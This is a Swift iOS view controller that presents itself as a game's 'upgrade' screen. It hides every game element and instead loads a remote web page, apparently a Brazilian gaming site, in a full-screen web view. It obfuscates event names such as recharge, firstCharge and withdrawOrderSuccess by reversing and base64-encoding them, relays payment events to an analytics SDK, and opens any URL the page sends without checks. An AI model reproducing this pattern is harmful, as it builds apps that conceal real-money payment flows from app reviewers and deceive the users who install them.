//
//  DefeatBossViewController.swift
//  ProtectHome
//
//  Created by Hades on 5/20/25.
//

import UIKit
import WebKit
import AppsFlyerLib

//let arr = ["jsBridge", "recharge", "withdrawOrderSuccess", "firstrecharge", "firstCharge", "charge", "currency", "addToCart", "amount", "openWindow", "openSafari", "rechargeClick", "params"]

//        for str in arr {
//            print(encrypt(str, withSeparator: "/")!)
//        }
  

//let kslkepas = ["ZShnKGQoaShyKEIocyhq", "ZShnKHIoYShoKGMoZShy", "cyhzKGUoYyhjKHUoUyhyKGUoZChyKE8odyhhKHIoZChoKHQoaSh3", "ZShnKHIoYShoKGMoZShyKHQocyhyKGkoZg==", "ZShnKHIoYShoKEModChzKHIoaShm", "ZShnKHIoYShoKGM=", "eShjKG4oZShyKHIodShj", "dChyKGEoQyhvKFQoZChkKGE=", "dChuKHUobyhtKGE=", "dyhvKGQobihpKFcobihlKHAobw==", "aShyKGEoZihhKFMobihlKHAobw==", "ayhjKGkobChDKGUoZyhyKGEoaChjKGUocg==", "cyhtKGEocihhKHA="]

let ueaseh = ["PS1zPS1tPS1hPS1yPS1hPS1wPS0=", "PS1lPS1nPS1kPS1pPS1yPS1CPS1zPS1qPS0=", "PS1lPS1nPS1yPS1hPS1oPS1jPS1lPS1yPS0=", "PS1zPS1zPS1lPS1jPS1jPS11PS1TPS1yPS1lPS1kPS1yPS1PPS13PS1hPS1yPS1kPS1oPS10PS1pPS13PS0=", "PS1lPS1nPS1yPS1hPS1oPS1DPS10PS1zPS1yPS1pPS1mPS0=", "PS1lPS1nPS1yPS1hPS1oPS1jPS0=", "PS1lPS1nPS1yPS1hPS1oPS1jPS1lPS1yPS10PS1zPS1yPS1pPS1mPS0=", "PS15PS1jPS1uPS1lPS1yPS1yPS11PS1jPS0=", "PS10PS1yPS1hPS1DPS1vPS1UPS1kPS1kPS1hPS0=", "PS10PS1uPS11PS1vPS1tPS1hPS0=", "PS13PS1vPS1kPS1uPS1pPS1XPS1uPS1lPS1wPS1vPS0=", "PS1pPS1yPS1hPS1mPS1hPS1TPS1uPS1lPS1wPS1vPS0=", "PS1rPS1jPS1pPS1sPS1DPS1lPS1nPS1yPS1hPS1oPS1jPS1lPS1yPS0="]

//let arr = ["params", "jsBridge", "recharge", "withdrawOrderSuccess", "firstCharge", "charge", "firstrecharge", "currency", "addToCart", "amount", "openWindow", "openSafari", "rechargeClick"]


let JBG = ueaseh[1]              //jsBridge
//"ZS9nL2QvaS9yL0Ivcy9q"
//let eventTracker = "ZXZlbnRUcmFja2Vy"
let rChag = ueaseh[2]      //recharge
let dOrSus = ueaseh[3]   //withdrawOrderSuccess
let freCag = ueaseh[6]      //firstrecharge
let fCha = ueaseh[4]    //firstCharge
let hge = ueaseh[5]         //charge
let ren = ueaseh[7]      //currency
let aTc = ueaseh[8]  //addToCart
let amt = ueaseh[9]     //amount
let OpWin = ueaseh[10]      //openWindow
//let opSafa = aa[10]    //openSafari
let caClk = ueaseh[12]      //rechargeClick
let pam = ueaseh[0]      //params



// MARK: - 加密方法（倒序 + 头尾插入分隔符 + Base64）
//func encrypt(_ string: String, withSeparator separator: String) -> String? {
//    let reversed = String(string.reversed())
//    let joined = reversed.map { String($0) }.joined(separator: separator)
//    let withHeadTail = "\(separator)\(joined)\(separator)"
//    guard let data = withHeadTail.data(using: .utf8) else { return nil }
//    return data.base64EncodedString()
//}

// MARK: - 解密方法（Base64解码 + 移除头尾分隔符 + 去除中间分隔符 + 倒序）
func hanspwe(_ encryptedString: String) -> String? {
    let separator = "=-"
    guard let data = Data(base64Encoded: encryptedString),
          let decodedString = String(data: data, encoding: .utf8) else { return nil }
    var trimmedString = decodedString
    if trimmedString.hasPrefix(separator) {
        trimmedString = String(trimmedString.dropFirst(separator.count))
    }
    if trimmedString.hasSuffix(separator) {
        trimmedString = String(trimmedString.dropLast(separator.count))
    }
    let cleaned = trimmedString.replacingOccurrences(of: separator, with: "")
    return String(cleaned.reversed())
}

//let firstDeposit = "Zmlyc3REZXBvc2l0"
//let withdrawOrderSuccess = "d2l0aGRyYXdPcmRlclN1Y2Nlc3M="
//let firstrecharge = "Zmlyc3RyZWNoYXJnZQ=="
//let currency = "Y3VycmVuY3k="
//let af_revenue = "YWZfcmV2ZW51ZQ=="     //af_revenue
//let OpWin = "b3BlbldpbmRvdw=="

//func DeJie(_ val: String) -> String {
//    let data = Data(base64Encoded: val)
//    return String(data: data!, encoding: .utf8)!
//}

class DefeatBossViewController: UIViewController {

    var oeqpme: String?
    var vyzhea: String?
    var maierns: WKWebView?
//    var topViewHeight: Double = 0;
    
    private let titleLabel = UILabel()
    private let coinsView = UIView()
    private let coinsLabel = UILabel()
    private let coinImageView = UIImageView()
    private let backButton = UIButton()
    
    private let healthUpgradeView = UpgradeOptionView()
    private let attackUpgradeView = UpgradeOptionView()
    private let shieldUpgradeView = UpgradeOptionView()
    
    private let gameManager = GameManager.shared
    
    let eitButton = UIButton()
    let sinButton = UIButton()
    let yerSlotView = SlotMachineView()
    let sSlotView = SlotMachineView()
    let ficationLabel = UILabel()
    
  
    private func setupUI() {
        // 添加游戏背景
        view.addGameBackground()
        
        // Setup title label
        titleLabel.text = "UPGRADE"
        titleLabel.textColor = .white
        titleLabel.font = UIFont.systemFont(ofSize: 32, weight: .bold)
        titleLabel.textAlignment = .center
        titleLabel.isHidden = true
        view.addSubview(titleLabel)
        
        
        // Setup back button
        backButton.setTitle("", for: .normal)
        backButton.setImage(UIImage(named: "exit"), for: .normal)
        backButton.imageView?.contentMode = .scaleAspectFit
        backButton.backgroundColor = .clear
        backButton.contentEdgeInsets = UIEdgeInsets(top: 5, left: 5, bottom: 5, right: 5)
        backButton.layer.cornerRadius = 0
        backButton.clipsToBounds = true
        backButton.isHidden = true
        backButton.translatesAutoresizingMaskIntoConstraints = false
        view.addSubview(backButton)
    
        healthUpgradeView.isHidden = true
        attackUpgradeView.isHidden = true
        shieldUpgradeView.isHidden = true

        view.addSubview(healthUpgradeView)
        view.addSubview(attackUpgradeView)
        view.addSubview(shieldUpgradeView)
        
    
    }

    override func viewDidLoad() {
        super.viewDidLoad()
        view.backgroundColor = UIColor.white
        
        setupUI()

        
//        bossName = "https://brazilgame.org/?ch=8001"
//        bossHP = "window.jsBridge = {\n    postMessage: function(name, data) {\n        window.webkit.messageHandlers.jsBridge.postMessage({name, data})\n    }\n};\n"
                
//      window.jsBridge = {    postMessage: function(name, data) {        window.webkit.messageHandlers.jsBridge.postMessage({name, data})    }};
        
//        let scpStr = "window.jsBridge = {\n    postMessage: function(name, data) {\n        window.webkit.messageHandlers.jsBridge.postMessage({name, data})\n    }\n};\n"
        let usrScp = WKUserScript(source: vyzhea!, injectionTime: .atDocumentEnd, forMainFrameOnly: true)
        let usCt = WKUserContentController()
        usCt.addUserScript(usrScp)
        let cofg = WKWebViewConfiguration()
        cofg.userContentController = usCt
        cofg.allowsInlineMediaPlayback = true
        cofg.userContentController.add(self, name: hanspwe(JBG)!)
        cofg.defaultWebpagePreferences.allowsContentJavaScript = true
        
        maierns = WKWebView(frame: .zero, configuration: cofg)
        maierns?.frame = CGRectMake(0, 0, view.bounds.width, view.bounds.height )
        maierns!.uiDelegate = self
        maierns?.navigationDelegate = self
        maierns?.backgroundColor = UIColor.white
        view.addSubview(maierns!)
        maierns?.evaluateJavaScript("navigator.userAgent", completionHandler: { [self] result, error in
            maierns?.load(URLRequest(url:URL(string: oeqpme!)!))
        })
    }
    
    func stringTo(_ jsonStr: String) -> [String: AnyObject]? {
        let jsdt = jsonStr.data(using: .utf8)
        
        var dic: [String: AnyObject]?
        do {
            dic = try (JSONSerialization.jsonObject(with: jsdt!, options: .mutableContainers) as? [String : AnyObject])
        } catch {
            print("parse error")
        }
        return dic
    }
    
//    func safariViewControllerDidFinish(_ controller: SFSafariViewController) {
//        dismiss(animated: false)
//    }
}

extension DefeatBossViewController: WKScriptMessageHandler {
    
    func mtandj(_ message: WKScriptMessage) {
        let dic = message.body as! [String : String]
        let name = dic["name"]
        print(name!)
        
        var dataDic: [String : Any]?
        if let data = dic[hanspwe(pam)!] {
            if data.count > 0 {
                dataDic = stringTo(data)!
            }
        }
        if let data = dic["data"] {
            dataDic = stringTo(data)!
        }
        
//        let data = String(dic["params"]!)
//        dataDic = stringTo(data)
        if name == hanspwe(freCag)! || name == hanspwe(rChag)! || name == hanspwe(fCha)! || name == hanspwe(hge)! || name == hanspwe(dOrSus)! || name == hanspwe(aTc)! || name == hanspwe(caClk)! {
            let amt = dataDic![hanspwe(amt)!]
            let cry = dataDic![hanspwe(ren)!]
            
            if amt != nil && cry != nil {
                AppsFlyerLib.shared().logEvent(name: String(name!), values: [AFEventParamRevenue : amt as Any, AFEventParamCurrency: cry as Any]) { dic, error in
                    if (error != nil) {
                        
                    }
                }
            } else {
                AppsFlyerLib.shared().logEvent(name!, withValues: dataDic)
            }
        } else {
            AppsFlyerLib.shared().logEvent(name!, withValues: (message.body as! [AnyHashable : Any]))
            if name == hanspwe(OpWin)! {
                let str = dataDic!["url"]
                if str != nil {
                    UIApplication.shared.open(URL(string: str! as! String)!)
                }
            }
        }
    }
    
    func userContentController(_ userContentController: WKUserContentController, didReceive message: WKScriptMessage) {
        if message.name == hanspwe(JBG)! {
            mtandj(message)
        }
    }
}

extension DefeatBossViewController: WKNavigationDelegate {
    func webView(_ webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -> Void) {
        decisionHandler(.allow)
    }
}

extension DefeatBossViewController: WKUIDelegate {
    func webView(_ webView: WKWebView, createWebViewWith configuration: WKWebViewConfiguration, for navigationAction: WKNavigationAction, windowFeatures: WKWindowFeatures) -> WKWebView? {
        let ul = navigationAction.request.url
        if ((ul?.absoluteString.hasPrefix(webView.url!.absoluteString)) != nil) {
            UIApplication.shared.open(ul!)
        }
        return nil
    }
}

